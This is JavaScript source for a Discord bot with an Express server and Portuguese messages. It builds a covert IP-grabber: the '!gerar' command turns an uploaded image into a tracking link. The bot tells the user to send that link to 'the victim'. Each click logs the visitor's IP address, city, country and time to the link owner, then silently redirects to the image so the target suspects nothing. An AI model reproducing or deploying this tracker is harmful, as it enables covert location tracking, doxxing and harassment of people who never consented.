const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const geoip = require('geoip-lite');
const { v4: uuidv4 } = require('uuid');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const app = express();
const links = {};
const userLogs = {};
client.awaitingImage = {};

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  
  const prefix = '!';
  
  if (!message.content.startsWith(prefix)) {
    if (client.awaitingImage[message.author.id]) {
      const attachment = message.attachments.first();
      if (!attachment || !attachment.contentType?.startsWith('image/')) {
        delete client.awaitingImage[message.author.id];
        return message.reply('❌ Envie uma imagem!');
      }
      
      const id = uuidv4().split('-')[0];
      links[id] = {
        url: attachment.url,
        owner: message.author.id,
        clicks: 0
      };
      
      delete client.awaitingImage[message.author.id];
      
      return message.reply(
        `✅ **Link gerado!**\n\n` +
        `🔗 \`${process.env.DOMAIN}/i/${id}\`\n\n` +
        `Manda esse link pra vítima!`
      );
    }
    return;
  }
  
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  
  if (cmd === 'ping') {
    return message.reply(`🏓 Ping: ${Date.now() - message.createdTimestamp}ms`);
  }
  
  if (cmd === 'gerar') {
    client.awaitingImage[message.author.id] = true;
    return message.reply('📤 Envie a imagem agora (30 segundos)!');
  }
  
  if (cmd === 'logs') {
    const channel = message.mentions.channels.first() || message.channel;
    userLogs[message.author.id] = channel.id;
    return message.reply(`✅ Logs em: ${channel}`);
  }
});

app.get('/i/:id', async (req, res) => {
  const link = links[req.params.id];
  if (!link) return res.send('Link inválido');
  
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
  const geo = geoip.lookup(ip);
  
  link.clicks++;
  
  const logMsg = `📸 **NOVO CLICK!**\nIP: \`${ip}\`\nLocal: ${geo ? geo.city + ', ' + geo.country : 'Desconhecido'}\nHorário: ${new Date().toLocaleString('pt-BR')}`;
  
  const channelId = userLogs[link.owner];
  if (channelId) {
    const channel = await client.channels.fetch(channelId).catch(() => null);
    if (channel) channel.send(logMsg);
  }
  
  const user = await client.users.fetch(link.owner).catch(() => null);
  if (user) user.send(logMsg);
  
  res.redirect(link.url);
});

app.get('/', (req, res) => res.send('Bot online!'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Servidor: ${PORT}`));

client.login(process.env.DISCORD_TOKEN);
console.log('🤖 Bot iniciando...');
